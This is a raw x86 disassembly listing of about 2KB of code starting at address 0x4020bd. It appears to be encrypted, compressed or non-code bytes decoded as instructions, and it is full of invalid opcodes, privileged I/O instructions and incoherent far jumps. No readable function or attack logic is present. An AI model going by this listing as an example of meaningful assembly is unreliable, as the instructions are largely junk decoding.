  4020bd:	sub    BYTE PTR ds:0x62adbdbb,bl
  4020c3:	ror    DWORD PTR [ecx+ebx*2-0x19],0xd8
  4020c8:	add    ebp,DWORD PTR [esi+0x55]
  4020cb:	cmp    al,0x8e
  4020cd:	ins    BYTE PTR es:[edi],dx
  4020ce:	imul   BYTE PTR [edx]
  4020d0:	add    bh,BYTE PTR [edi]
  4020d2:	test   BYTE PTR [esi],al
  4020d4:	and    al,0x87
  4020d6:	int3   
  4020d7:	jae    0x402138
  4020d9:	or     eax,0xc47d28a6
  4020de:	push   esi
  4020df:	sti    
  4020e0:	dec    edx
  4020e1:	inc    esp
  4020e2:	push   0x5c
  4020e4:	std    
  4020e5:	clc    
  4020e6:	adc    edi,DWORD PTR [ecx+0xea1940c]
  4020ec:	xor    eax,0x800fdc14
  4020f1:	out    0x6e,eax
  4020f3:	push   esp
  4020f4:	aas    
  4020f5:	fs bnd jmp 0x402127
  4020f9:	jbe    0x4020e2
  4020fb:	inc    ebp
  4020fc:	mov    ch,0xb3
  4020fe:	pop    edx
  4020ff:	add    bh,BYTE PTR [edi-0x388af886]
  402105:	sbb    DWORD PTR [esi+0x51],ebp
  402108:	int3   
  402109:	inc    ebx
  40210a:	jno    0x40211d
  40210c:	sub    al,0xb0
  40210e:	sbb    BYTE PTR [ecx+ebp*4+0x19],al
  402112:	mov    dl,0xa8
  402114:	(bad)  
  402115:	jo     0x4020c2
  402117:	nop/reserved BYTE PTR [ecx]
  40211a:	dec    ebp
  40211b:	aaa    
  40211c:	mov    bh,0x32
  40211e:	jl     0x40217a
  402120:	cli    
  402121:	pop    esp
  402122:	repz xlat BYTE PTR ds:[ebx]
  402124:	and    al,0x54
  402126:	add    al,0x28
  402128:	mov    bl,0x7b
  40212a:	xor    al,BYTE PTR [ebp+0x59]
  40212d:	xor    BYTE PTR ds:0xde2fc4ef,bh
  402133:	je     0x40211a
  402135:	neg    edx
  402137:	adc    al,0xa0
  402139:	in     al,dx
  40213a:	push   ds
  40213b:	fidiv  WORD PTR [eax+eax*8-0x1b]
  40213f:	cmp    eax,ecx
  402141:	inc    edi
  402142:	jae    0x4020f8
  402144:	pop    es
  402145:	xchg   esi,eax
  402146:	loopne 0x402113
  402148:	ret    
  402149:	jnp    0x402148
  40214b:	and    BYTE PTR [edi-0xe],dl
  40214e:	inc    ecx
  40214f:	arpl   sp,di
  402151:	fwait
  402152:	add    bl,ah
  402154:	mov    ah,bh
  402156:	bound  ecx,QWORD PTR [edx+esi*2+0x2ff69770]
  40215d:	ror    DWORD PTR [edi],1
  40215f:	sbb    BYTE PTR [ecx],dh
  402161:	ds mov eax,0x4239800
  402167:	cmp    DWORD PTR [edi-0x39],esp
  40216a:	(bad)  
  40216b:	and    bl,al
  40216d:	retf   0x88b0
  402170:	mov    cl,0x9c
  402172:	out    dx,eax
  402173:	mov    eax,ds:0xfc2518e4
  402178:	inc    ecx
  402179:	xchg   ebp,eax
  40217a:	pusha  
  40217b:	test   eax,0xa5652933
  402180:	cmp    BYTE PTR [ecx-0x1c68b1f0],bl
  402186:	dec    edi
  402187:	sbb    ecx,esi
  402189:	jmp    0xe73d:0xebfcdcab
  402190:	sbb    DWORD PTR [ecx+0xf],esp
  402193:	les    ebx,FWORD PTR ds:0x86645085
  402199:	sub    BYTE PTR cs:[ebp-0x37ace114],ch
  4021a0:	mov    edi,0xf1ec2c22
  4021a5:	sbb    BYTE PTR [ebp-0xa],bl
  4021a8:	or     esi,DWORD PTR [edi+eiz*1+0x7492a8]
  4021af:	in     al,dx
  4021b0:	or     BYTE PTR [edx+edx*1],al
  4021b3:	mov    edx,0x4bc178cf
  4021b8:	int    0x0
  4021ba:	outs   dx,DWORD PTR ds:[esi]
  4021bb:	sbb    esi,ebx
  4021bd:	pop    edi
  4021be:	test   BYTE PTR ds:0x1377282c,al
  4021c4:	mov    dh,0x51
  4021c6:	jg     0x40216d
  4021c8:	es lahf 
  4021ca:	loopne 0x4021d0
  4021cc:	call   0xe6c55729
  4021d1:	leave  
  4021d2:	out    dx,al
  4021d3:	xor    ch,ah
  4021d5:	push   ebx
  4021d6:	mov    ds:0xc7d7046b,eax
  4021db:	sub    BYTE PTR [ebx],ah
  4021dd:	test   BYTE PTR [edi-0x64],dl
  4021e0:	icebp  
  4021e1:	call   0x8bc21336
  4021e6:	add    DWORD PTR [ecx-0x22],0xba5e2811
  4021ed:	cs xchg ebx,eax
  4021ef:	xor    BYTE PTR [ebx],bl
  4021f1:	mov    bl,0x53
  4021f3:	cld    
  4021f4:	nop
  4021f5:	nop
  4021f6:	or     DWORD PTR [edi],0x11763ee6
  4021fc:	adc    bl,BYTE PTR [eax-0x63]
  4021ff:	inc    ebp
  402200:	retf   
  402201:	sar    BYTE PTR [ebp-0x4d4db4f],cl
  402207:	pop    esi
  402208:	jp     0x402192
  40220a:	xor    esp,DWORD PTR [eax]
  40220c:	mov    ds:0xd8719f16,eax
  402211:	and    al,BYTE PTR [ebp-0x478904a4]
  402217:	mov    ebx,esi
  402219:	mov    ebx,0xd72db12a
  40221e:	pop    es
  40221f:	adc    eax,0x52d4a0c4
  402224:	cmp    BYTE PTR [edi+0x350df926],bh
  40222a:	cld    
  40222b:	cmp    dh,BYTE PTR ds:0x4f261083
  402231:	inc    ecx
  402232:	pop    esi
  402233:	jae    0x4021f2
  402235:	dec    ebp
  402236:	mov    al,BYTE PTR [edi]
  402238:	sti    
  402239:	jecxz  0x402290
  40223b:	pop    edi
  40223c:	ins    DWORD PTR es:[edi],dx
  40223d:	mov    eax,0x8ba43278
  402242:	repz pop ebp
  402244:	loope  0x40222a
  402246:	popf   
  402247:	sub    cl,BYTE PTR [ecx]
  402249:	rol    BYTE PTR [edx],1
  40224b:	mov    ebx,0x6c2c66f2
  402250:	sbb    al,0x2e
  402252:	daa    
  402253:	sbb    cl,dl
  402255:	mov    DWORD PTR [ebx],edi
  402257:	sub    BYTE PTR [ebx+0x32221dcf],cl
  40225d:	xlat   BYTE PTR ds:[ebx]
  40225e:	and    al,0x67
  402260:	push   es
  402261:	std    
  402262:	mov    al,0xee
  402264:	je     0x40223a
  402266:	push   0x43483b07
  40226b:	sub    al,0x77
  40226d:	test   al,0xf0
  40226f:	popf   
  402270:	test   eax,0xf1496672
  402275:	adc    eax,0x8dbff41e
  40227a:	data16 xor cl,dl
  40227d:	push   esi
  40227e:	pusha  
  40227f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402280:	pop    ds
  402281:	call   0xa694:0x568fc378
  402288:	cwde   
  402289:	inc    eax
  40228a:	push   ss
  40228b:	sbb    DWORD PTR [eax+0x9ec9d77],ebx
  402291:	dec    esp
  402292:	and    eax,0x37741f24
  402297:	pop    ds
  402298:	lahf   
  402299:	call   0x44d3ebf2
  40229e:	test   DWORD PTR [ebp-0x4a303d12],ecx
  4022a4:	mov    ah,0xd2
  4022a6:	jo     0x402246
  4022a8:	scas   eax,DWORD PTR es:[edi]
  4022a9:	adc    BYTE PTR [ebp-0xa65ffbf],0xff
  4022b0:	push   cs
  4022b1:	ret    
  4022b2:	or     BYTE PTR [edx],bl
  4022b4:	ss int3 
  4022b6:	inc    esi
  4022b7:	pop    ss
  4022b8:	int    0xda
  4022ba:	inc    esi
  4022bb:	jns    0x402285
  4022bd:	push   cs
  4022be:	dec    edi
  4022bf:	jae    0x402287
  4022c1:	jae    0x402320
  4022c3:	pop    esp
  4022c4:	push   ds
  4022c5:	xchg   al,cl
  4022c7:	ja     0x4022de
  4022c9:	gs inc ebx
  4022cb:	aaa    
  4022cc:	sar    BYTE PTR [ebp+0x18],cl
  4022cf:	cmp    al,0xda
  4022d1:	outs   dx,DWORD PTR ds:[esi]
  4022d2:	pop    esi
  4022d3:	pop    esi
  4022d4:	jne    0x40227f
  4022d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d7:	(bad)  
  4022d8:	test   eax,0x34bd850
  4022dd:	cli    
  4022de:	dec    eax
  4022df:	dec    ebx
  4022e0:	lods   al,BYTE PTR ds:[esi]
  4022e1:	ret    
  4022e2:	cmc    
  4022e3:	xchg   esi,eax
  4022e4:	jmp    0x436b960a
  4022e9:	(bad)  
  4022ea:	lea    edi,[edx]
  4022ec:	xchg   ebx,eax
  4022ed:	sar    BYTE PTR [edx+0xd],1
  4022f0:	arpl   WORD PTR [edi+eiz*4],sp
  4022f3:	dec    ebp
  4022f4:	mov    ch,0xfe
  4022f6:	test   BYTE PTR [ecx],al
  4022f8:	hlt    
  4022f9:	loopne 0x4022d2
  4022fb:	sbb    eax,0x31eb4957
  402300:	pusha  
  402301:	pop    ss
  402302:	addr16 sub cl,bl
  402305:	repz stc 
  402307:	nop
  402308:	pop    ss
  402309:	ins    BYTE PTR es:[edi],dx
  40230a:	xchg   ch,ah
  40230c:	int    0x50
  40230e:	not    ecx
  402310:	or     edx,0x9ed2f075
  402316:	(bad)  
  402317:	sub    BYTE PTR [ecx],dl
  402319:	and    dh,BYTE PTR [ebx-0x35]
  40231c:	add    BYTE PTR [ebx+ebp*2],al
  40231f:	lock gs sub al,0xf4
  402323:	scas   al,BYTE PTR es:[edi]
  402324:	stos   DWORD PTR es:[edi],eax
  402325:	pop    eax
  402326:	pop    ss
  402327:	mov    ecx,0x45af69b9
  40232c:	mov    bl,BYTE PTR [edi]
  40232e:	inc    edx
  40232f:	jbe    0x4022b9
  402331:	popf   
  402332:	xlat   BYTE PTR ds:[ebx]
  402333:	dec    edi
  402334:	add    edi,DWORD PTR [edi+0x47]
  402337:	or     ebp,ebx
  402339:	or     bh,dl
  40233b:	leave  
  40233c:	sub    eax,0x57045074
  402341:	js     0x4022cc
  402343:	outs   dx,BYTE PTR ds:[esi]
  402344:	xchg   BYTE PTR [eax],ah
  402346:	xchg   ebp,eax
  402347:	pop    ds
  402348:	call   0xa242:0x37997c0a
  40234f:	js     0x402329
  402351:	adc    al,BYTE PTR [eax]
  402353:	push   0x32
  402355:	xchg   edx,eax
  402356:	xchg   BYTE PTR [edi+0x7a],ch
  402359:	ret    0x9e46
  40235c:	mov    ah,0x10
  40235e:	pop    ecx
  40235f:	sbb    eax,0x992668c9
  402364:	popf   
  402365:	or     eax,0xeb657912
  40236a:	scas   al,BYTE PTR es:[edi]
  40236b:	in     al,dx
  40236c:	out    0x5c,al
  40236e:	out    0x37,al
  402370:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402372:	call   0x412a1589
  402377:	xor    eax,0x267797f4
  40237c:	icebp  
  40237d:	push   cs
  40237e:	fsubrp st(5),st
  402380:	aam    0xf1
  402382:	mov    DWORD PTR [edi-0x4e247424],0x602eb8f2
  40238c:	pop    ss
  40238d:	out    0xdd,al
  40238f:	or     ah,BYTE PTR [edx-0x669eac4d]
  402395:	pop    ebx
  402396:	jl     0x402407
  402398:	and    al,0x89
  40239a:	mov    dh,0x63
  40239c:	(bad)  
  40239e:	sub    cl,dl
  4023a0:	xchg   esp,eax
  4023a1:	cmovl  esp,DWORD PTR [edx]
  4023a4:	popa   
  4023a5:	xchg   ebx,eax
  4023a6:	inc    ebx
  4023a7:	lea    edi,ds:0xdb0a3736
  4023ad:	idiv   DWORD PTR [ebx]
  4023af:	iret   
  4023b0:	add    BYTE PTR [ebx-0x46],ch
  4023b3:	loope  0x40239e
  4023b5:	shl    BYTE PTR [edx-0x2d36d684],1
  4023bb:	xchg   ecx,eax
  4023bc:	popa   
  4023bd:	fidivr DWORD PTR [edx+eax*8+0x7]
  4023c1:	call   0x242d65d7
  4023c6:	nop
  4023c7:	test   eax,0x8f9390e4
  4023cc:	inc    esp
  4023cd:	jbe    0x4023bb
  4023cf:	inc    ebx
  4023d0:	mov    ds:0x1aeadc00,eax
  4023d5:	adc    BYTE PTR [eax+0x3484f239],0x24
  4023dc:	mov    ebp,0xac767b9a
  4023e1:	mov    WORD PTR [esi-0x3df68645],es
  4023e7:	into   
  4023e8:	clc    
  4023e9:	sub    esi,DWORD PTR [ecx]
  4023eb:	fwait
  4023ec:	mov    ?,WORD PTR [eax+0x28]
  4023ef:	xchg   ecx,eax
  4023f0:	into   
  4023f1:	add    BYTE PTR [edx-0xb59263e],0x60
  4023f8:	jmp    FWORD PTR [edi+0x4ef436b6]
  4023fe:	mov    bl,0xb4
  402401:	push   0xeb0d9be6
  402406:	mov    DWORD PTR [edx],esp
  402408:	dec    esi
  402409:	mov    ecx,0x4cd373c8
  40240e:	call   0xa419:0x1c88c4ad
  402415:	or     eax,0xff580081
  40241a:	rol    BYTE PTR [ecx],cl
  40241c:	mov    ds:0x9f97e704,al
  402421:	adc    DWORD PTR [edx],esp
  402423:	mov    fs,WORD PTR [ebp+0x72043c21]
  402429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40242a:	jl     0x4023d9
  40242c:	ror    BYTE PTR [esi+0x68],cl
  40242f:	clc    
  402430:	jp     0x40247c
  402432:	push   ebx
  402433:	mov    al,0x19
  402435:	lds    edx,FWORD PTR [ebx+0x1d]
  402438:	push   eax
  402439:	or     BYTE PTR [edx+0x48],bh
  40243c:	add    ebp,DWORD PTR [esi]
  40243e:	push   cs
  40243f:	or     ecx,DWORD PTR [edx+ebp*8-0x4]
  402443:	fnstcw WORD PTR [ebx+0x53]
  402446:	jmp    0x13d:0x1df45021
  40244d:	cmp    dl,bh
  40244f:	dec    ecx
  402450:	stos   DWORD PTR es:[edi],eax
  402451:	out    0x4,al
  402453:	in     eax,dx
  402454:	(bad)
  402458:	loope  0x40248f
  40245a:	dec    eax
  40245b:	lea    ebx,[eax-0x65281bea]
  402461:	xchg   ebp,eax
  402462:	xor    DWORD PTR [esi],0xffffff94
  402465:	push   es
  402466:	test   bh,bl
  402468:	ja     0x40243e
  40246a:	call   0x8bd1:0xa0738bea
  402471:	pop    esp
  402472:	stc    
  402473:	cmp    eax,0xe0aaea83
  402478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402479:	fldenv [eax+0x70]
  40247c:	xor    al,0xca
  40247e:	dec    ecx
  40247f:	and    ecx,edi
  402481:	mov    dh,BYTE PTR [ecx-0x7c]
  402484:	std    
  402485:	stos   BYTE PTR es:[edi],al
  402486:	push   edx
  402487:	mov    fs,ecx
  402489:	call   0xcd48:0xeb247dfd
  402490:	fcomp  DWORD PTR [edi]
  402492:	mov    ebp,0xf6af18f7
  402497:	inc    edx
  402498:	push   esp
  402499:	jmp    0x402509
  40249b:	shl    esi,1
  40249d:	fmul   DWORD PTR [ecx+0x552dfb49]
  4024a3:	push   edi
  4024a4:	jmp    0xaffce9af
  4024a9:	xchg   bl,cl
  4024ab:	daa    
  4024ac:	cmp    bh,BYTE PTR [edx]
  4024ae:	add    BYTE PTR [ebx+edx*1-0x30727582],0x2f
  4024b6:	xor    eax,0xf7485ff5
  4024bb:	push   es
  4024bc:	inc    edi
  4024bd:	jbe    0x4024df
  4024bf:	mov    ebp,0x5981342a
  4024c4:	cld    
  4024c5:	pop    edi
  4024c6:	cmp    ebp,ecx
  4024c8:	stos   BYTE PTR es:[edi],al
  4024c9:	dec    ecx
  4024ca:	mov    ebx,0xd357eb2
  4024cf:	shl    DWORD PTR [ebp+eax*8+0x21],0x81
  4024d4:	cmp    DWORD PTR [esi+0x47],edx
  4024d7:	les    ecx,FWORD PTR ds:0xc0bcc9a9
  4024dd:	mov    esp,0xd830bed5
  4024e2:	in     eax,0xff
  4024e4:	sahf   
  4024e5:	xor    DWORD PTR [edi-0x446d59a4],ebx
  4024eb:	in     al,0x5f
  4024ed:	push   esp
  4024ee:	jno    0x40256b
  4024f0:	lea    esp,[eax]
  4024f2:	inc    eax
  4024f3:	mov    dl,0xe6
  4024f5:	push   esi
  4024f6:	push   esi
  4024f7:	mov    edx,0x94554f5e
  4024fc:	or     BYTE PTR ds:[edi-0x21],0xf9
  402501:	ja     0x4024a1
  402503:	stc    
  402504:	sub    DWORD PTR [ebx-0x12],edi
  402507:	test   BYTE PTR [esi],bl
  402509:	pop    ss
  40250a:	(bad)
  40250f:	cmp    al,0x88
  402511:	inc    ecx
  402512:	inc    ebx
  402513:	jne    0x4024b4
  402515:	repnz (bad) 
  402517:	mov    ebp,0x8438e864
  40251c:	lds    edx,FWORD PTR [ecx]
  40251e:	jbe    0x402599
  402520:	xlat   BYTE PTR ds:[ebx]
  402521:	dec    ebp
  402522:	ret    0xa51
  402525:	cmc    
  402526:	add    edi,edi
  402528:	mov    eax,ds:0x903ed9b8
  40252d:	sbb    cl,bl
  40252f:	xchg   esi,eax
  402530:	fcomi  st,st(7)
  402532:	ret    0xb98b
  402535:	jne    0x40259e
  402537:	mov    eax,ds:0xe7933c74
  40253c:	or     DWORD PTR [edi+0x586c0c0c],edx
  402542:	add    BYTE PTR ds:0x9b5059e6,bl
  402548:	push   ds
  402549:	mov    ss,WORD PTR [esi+0x52]
  40254c:	test   al,0x5b
  40254e:	add    DWORD PTR [esi],edx
  402550:	pop    ds
  402551:	dec    ebp
  402552:	rcl    ebp,cl
  402554:	(bad)  
  402555:	adc    esi,DWORD PTR [esi]
  402557:	pop    ss
  402558:	sub    DWORD PTR [edi+eax*2+0x4218b464],0x3cf04438
  402563:	icebp  
  402564:	in     al,dx
  402565:	(bad)  
  402566:	xchg   ebp,eax
  402567:	sbb    BYTE PTR [ebp+0x184d77e4],bh
  40256d:	cmp    al,0xbc
  40256f:	jecxz  0x40259f
  402571:	(bad)  
  402572:	into   
  402573:	mov    esi,0x19ae1c22
  402578:	xchg   edx,eax
  402579:	das    
  40257a:	xor    ebx,eax
  40257c:	or     edi,esp
  40257e:	dec    ebx
  40257f:	add    eax,DWORD PTR [esi-0x65]
  402582:	cmc    
  402583:	pop    eax
  402584:	pop    edx
  402585:	mov    esi,0x7802d445
  40258a:	cli    
  40258b:	psubsb mm6,QWORD PTR [ebx+ecx*1+0x7d]
  402590:	retf   
  402591:	loope  0x4025fe
  402593:	bsf    ebx,DWORD PTR [esi+edx*8]
  402597:	shl    DWORD PTR [ebp+0x73300996],1
  40259d:	adc    eax,0x1103c235
  4025a2:	std    
  4025a3:	sub    eax,0xa8f889e8
  4025a8:	adc    ebp,0xffffffef
  4025ab:	pop    ebx
  4025ac:	mov    ebx,0x1e6043a6
  4025b1:	jne    0x4025a4
  4025b3:	cwde   
  4025b4:	out    0xc4,eax
  4025b6:	adc    BYTE PTR gs:[eax-0x39],dl
  4025ba:	push   0x37
  4025bc:	add    al,0xe8
  4025be:	(bad)  
  4025bf:	pop    edx
  4025c0:	mov    DWORD PTR [esi+0xb],ebp
  4025c3:	xchg   edi,eax
  4025c4:	div    BYTE PTR [ebx+0x45]
  4025c7:	xchg   edx,eax
  4025c8:	jecxz  0x402605
  4025ca:	rcl    bh,1
  4025cc:	ja     0x402603
  4025ce:	test   al,0x1f
  4025d0:	xchg   edi,eax
  4025d1:	je     0x402564
  4025d3:	ins    DWORD PTR es:[edi],dx
  4025d4:	stc    
  4025d5:	hlt    
  4025d6:	outs   dx,DWORD PTR ds:[esi]
  4025d7:	pop    edi
  4025d8:	call   0x9c9e:0xfb326d94
  4025df:	aaa    
  4025e0:	je     0x402647
  4025e2:	retf   0x2796
  4025e5:	mov    ebp,DWORD PTR [ecx+edx*8-0x62]
  4025e9:	cmp    ebx,DWORD PTR [ebp+0x50467a09]
  4025ef:	ret    0xfdd1
  4025f2:	ins    BYTE PTR es:[edi],dx
  4025f3:	jae    0x4025b6
  4025f5:	neg    DWORD PTR [edi]
  4025f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f8:	(bad)  
  4025f9:	dec    esi
  4025fa:	mov    ah,0x9b
  4025fc:	(bad)  
  4025fd:	jmp    FWORD PTR [ebx+0x2d]
  402600:	push   ss
  402601:	mov    gs,WORD PTR [ecx-0x11]
  402604:	(bad)  
  402605:	inc    DWORD PTR [edi+0x13]
  402608:	xchg   ebp,eax
  402609:	repz adc ch,BYTE PTR ds:0x17aaad07
  402610:	ss push eax
  402612:	das    
  402613:	addr16 out 0xa6,al
  402616:	jg     0x402639
  402618:	into   
  402619:	inc    esp
  40261a:	(bad)  
  40261c:	push   0x1f
  40261e:	jle    0x40266b
  402620:	mov    esp,0xfd164b6d
  402625:	cmc    
  402626:	pop    edx
  402627:	mov    cl,0x69
  402629:	dec    esp
  40262a:	(bad)  
  40262b:	or     DWORD PTR ss:[ecx+ebx*4-0x27],edx
  402630:	std    
  402631:	call   0x8c6:0xfa65c6c3
  402638:	mov    ebx,0x42d36430
  40263d:	rcr    BYTE PTR [edx+eax*1],cl
  402640:	sbb    eax,0xe292a472
  402645:	pop    ds
  402646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402647:	pushf  
  402648:	pop    eax
  402649:	sub    BYTE PTR [esi],ah
  40264b:	jb     0x402674
  40264d:	nop
  40264e:	pop    es
  40264f:	dec    ecx
  402650:	sub    al,0xf6
  402652:	add    bl,BYTE PTR [ebx]
  402654:	add    BYTE PTR [ecx+0x18f2bff7],al
  40265a:	shl    DWORD PTR [edi-0x76c32e70],1
  402660:	in     eax,0x70
  402662:	mov    bl,0x52
  402664:	test   al,0x44
  402666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402667:	imul   esi,esi,0x2fffafe
  40266d:	repz sar BYTE PTR [ebx+0x1b363a82],1
  402674:	lahf   
  402675:	das    
  402676:	mov    dl,0xf5
  402678:	push   edx
  402679:	jmp    0x30c5c8b5
  40267e:	push   eax
  40267f:	leave  
  402680:	aaa    
  402681:	push   edi
  402682:	or     eax,0x8ef935d3
  402687:	cs cli 
  402689:	inc    edi
  40268a:	test   dl,ch
  40268c:	fsub   st,st(3)
  40268e:	icebp  
  40268f:	jmp    0x11cf7233
  402694:	pop    ebp
  402695:	in     al,0xb3
  402697:	imul   ebx,edx,0x7d
  40269a:	jbe    0x402661
  40269c:	popf   
  40269d:	inc    esi
  40269e:	(bad)  
  40269f:	cld    
  4026a0:	(bad)  
  4026a1:	call   0xe41eb3ef
  4026a6:	mov    ecx,esi
  4026a8:	dec    edx
  4026a9:	push   ebp
  4026aa:	sub    eax,0xb515b744
  4026af:	push   cs
  4026b0:	lods   eax,DWORD PTR ds:[esi]
  4026b1:	stc    
  4026b2:	das    
  4026b3:	imul   edi,DWORD PTR [edi+edx*2+0x63],0x680af635
  4026bb:	jmp    0x8e354076
  4026c0:	repnz pushf 
  4026c2:	inc    ebx
  4026c3:	sub    BYTE PTR [eax-0x64311f24],al
  4026c9:	ins    DWORD PTR es:[edi],dx
  4026ca:	jno    0x402702
  4026cc:	in     eax,dx
  4026cd:	jno    0x402688
  4026cf:	xchg   ebp,eax
  4026d0:	imul   ecx,DWORD PTR es:[esi-0xb0fce5b],0x7b9e43f3
  4026db:	(bad)  
  4026dc:	pop    ecx
  4026dd:	pop    ecx
  4026de:	mov    edi,0xb69c068e
  4026e3:	aam    0x70
  4026e5:	mov    esp,0x28301ee7
  4026ea:	icebp  
  4026eb:	arpl   WORD PTR [ebx],bx
  4026ed:	sub    al,0x76
  4026ef:	push   ebp
  4026f0:	es inc ebp
  4026f2:	icebp  
  4026f3:	in     al,0x37
  4026f5:	jmp    FWORD PTR [edi+edi*1]
  4026f8:	test   DWORD PTR [ecx+edx*8-0x3334df0],esi
  4026ff:	mov    dh,0xa
  402701:	sub    DWORD PTR [esi+0x7e622416],edx
  402707:	(bad)  
  402708:	add    al,0x17
  40270a:	int3   
  40270b:	daa    
  40270c:	mov    dl,0x48
  40270e:	mov    ebp,0xdcf4844a
  402714:	(bad)  
  402715:	xchg   ebx,eax
  402716:	cmp    edx,DWORD PTR [esi]
  402718:	mov    ah,dh
  40271a:	daa    
  40271b:	int3   
  40271c:	addr16 pop esp
  40271e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40271f:	lds    edx,FWORD PTR [ecx]
  402721:	add    al,BYTE PTR [edx-0x34]
  402724:	and    ebp,ebp
  402726:	call   0x6924b90c
  40272b:	inc    ebp
  40272c:	cmp    bl,BYTE PTR [eax+0x64901e4]
  402732:	xchg   esi,eax
  402733:	xchg   BYTE PTR [ecx+0x50318829],bl
  402739:	les    ecx,FWORD PTR [edi-0x458d0a99]
  40273f:	neg    DWORD PTR [edi-0x9]
  402742:	retf   0x4623
  402745:	or     cl,BYTE PTR [edx+ebx*8+0x22]
  402749:	inc    esp
  40274a:	xchg   esp,eax
  40274b:	jl     0x402748
  40274d:	rcr    DWORD PTR ds:0xcd4f27fc,cl
  402753:	xchg   edi,eax
  402754:	pop    ds
  402755:	xor    BYTE PTR [esi+0x7],cl
  402758:	bound  eax,QWORD PTR [edx]
  40275a:	xor    BYTE PTR [ebp+0x5a],al
  40275d:	jae    0x402753
  40275f:	repnz push ebp
  402761:	jno    0x4027db
  402763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402764:	inc    edi
  402765:	int    0xa0
  402767:	aam    0x78
  402769:	ja     0x402712
  40276b:	cwde   
  40276c:	bnd jg 0x402769
  40276f:	inc    ebx
  402770:	adc    al,0xb5
  402772:	int    0x2a
  402774:	jno    0x402707
  402776:	and    cl,BYTE PTR [esi]
  402778:	int    0xc8
  40277a:	or     eax,0xd6d8f0ad
  40277f:	jb     0x402798
  402781:	sub    al,0xbf
  402783:	sub    DWORD PTR [edi-0x27],ebx
  402786:	mov    DWORD PTR [esi],esi
  402788:	into   
  402789:	inc    ecx
  40278a:	inc    bl
  40278c:	(bad)  
  40278d:	jb     0x4027fc
  40278f:	inc    ebx
  402790:	sbb    al,0xf2
  402792:	addr16 jo 0x402803
  402795:	adc    bh,bh
  402797:	inc    eax
  402798:	dec    ebx
  402799:	pop    ecx
  40279a:	out    dx,al
  40279b:	push   edi
  40279c:	sahf   
  40279d:	int3   
  40279e:	fwait
  40279f:	ins    DWORD PTR es:[edi],dx
  4027a0:	add    edx,ebx
  4027a2:	dec    ebp
  4027a3:	push   eax
  4027a4:	mov    dh,0xb
  4027a6:	sub    BYTE PTR [edx+0x2f452219],ah
  4027ac:	sbb    DWORD PTR ds:[ecx-0x19016c5d],ebx
  4027b3:	test   al,0x52
  4027b5:	daa    
  4027b6:	cmc    
  4027b7:	dec    edi
  4027b8:	push   0xb014c1da
  4027bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027be:	mov    ?,WORD PTR [edi+0x6e]
  4027c1:	in     eax,dx
  4027c2:	loope  0x402840
  4027c4:	retf   
  4027c5:	pop    ds
  4027c6:	sub    al,0xef
  4027c8:	inc    esp
  4027c9:	jae    0x4027ee
  4027cb:	xchg   ebx,eax
  4027cc:	inc    ecx
  4027cd:	push   edi
  4027ce:	pop    edx
  4027cf:	xchg   BYTE PTR [esi+0x7b],ch
  4027d2:	setge  BYTE PTR [edi]
  4027d5:	inc    esp
  4027d6:	les    edi,FWORD PTR [eax-0x68]
  4027d9:	xchg   edi,eax
  4027da:	test   eax,0xd1f585e8
  4027df:	les    ebx,FWORD PTR [eax]
  4027e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e2:	dec    ebx
  4027e3:	ret    0x8f35
  4027e6:	add    al,BYTE PTR [esi+ecx*8-0x5533b105]
  4027ed:	(bad)  
  4027ee:	out    0xf7,al
  4027f0:	inc    edx
  4027f1:	stc    
  4027f2:	inc    eax
  4027f3:	jb     0x4027c2
  4027f5:	xchg   DWORD PTR [esi],esi
  4027f7:	les    esp,FWORD PTR [edx]
  4027f9:	pop    eax
  4027fa:	fnsave [eax]
  4027fc:	loope  0x4027ec
  4027fe:	call   0xc110fba0
  402803:	jb     0x402879
  402805:	cld    
  402806:	mov    edi,0x37d49470
  40280b:	fisttp DWORD PTR [edx+0x13c01fef]
  402811:	pusha  
  402812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402813:	daa    
  402814:	cmp    BYTE PTR [ebp+0x5e],0x29
  402818:	imul   edi,DWORD PTR [edi+0x31c25386],0xceedc80
  402822:	fldcw  WORD PTR [ecx]
  402824:	mov    edx,ebx
  402826:	xor    cl,BYTE PTR [edi+ebx*2]
  402829:	fst    st(7)
  40282b:	xchg   ecx,eax
  40282c:	(bad)  
  40282d:	fsub   DWORD PTR [edx+0x7ad1a89b]
  402833:	pop    esi
  402834:	adc    eax,0x60fc054b
  402839:	pop    esi
  40283a:	ins    DWORD PTR es:[edi],dx
  40283b:	add    ebx,DWORD PTR [eax+0x5f]
  40283e:	pop    es
  40283f:	cwde   
  402840:	fcomi  st,st(7)
  402842:	mov    esi,0xaa70d80b
  402847:	mov    eax,ds:0x691726e0
  40284c:	fistp  QWORD PTR [esi+0x32]
  40284f:	push   0x12
  402851:	sbb    eax,0x53c2adbd
  402856:	ficom  WORD PTR [eax-0x570c8d6c]
  40285c:	(bad)  
  40285d:	lahf   
  40285e:	in     eax,0x63
  402860:	sbb    cl,cl
  402862:	cmp    al,0x6f
  402864:	fild   DWORD PTR [edx]
  402866:	pop    edi
  402867:	inc    eax
  402868:	xor    ecx,ecx
  40286a:	or     al,0x9d
  40286c:	test   BYTE PTR [esi],dh
  40286e:	mov    ds:0x8ba61a91,eax
  402873:	aad    0x4
  402875:	jns    0x402803
  402877:	popf   
  402878:	push   0x3b
  40287a:	pop    edx
  40287b:	cld    
  40287c:	retf   
  40287d:	data16 loopne 0x40280b
  402880:	or     DWORD PTR [ecx+0x33],0x19
  402884:	dec    ebx
  402885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402886:	dec    ebp
  402887:	stos   BYTE PTR es:[edi],al
  402888:	ins    DWORD PTR es:[edi],dx
  402889:	sub    BYTE PTR [eax-0x97b334c],0xe4
  402890:	outs   dx,BYTE PTR ds:[esi]
  402891:	ja     0x4028ee
  402893:	xchg   esp,eax
